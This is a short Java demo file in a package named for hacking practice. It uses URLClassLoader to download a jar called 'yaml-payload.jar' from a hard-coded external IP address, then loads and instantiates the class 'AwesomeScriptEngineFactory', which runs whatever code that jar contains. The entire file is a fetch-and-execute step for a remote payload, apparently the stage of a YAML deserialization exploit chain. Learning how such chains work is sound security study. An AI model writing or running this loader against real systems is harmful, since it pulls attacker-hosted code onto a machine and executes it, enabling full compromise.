package com.xjjlearning.hack.java.basic.classloader;

import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * Created by xjj on 2023/5/4.
 */
public class URLClassLoaderDemo {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        URL url = new URL("http://47.95.7.37:9870/tomcat/yaml-payload.jar");
        URLClassLoader loader = new URLClassLoader(new URL[]{url});
        Class cl = Class.forName("AwesomeScriptEngineFactory", true, loader);
        cl.newInstance();
        loader.close();
    }
}
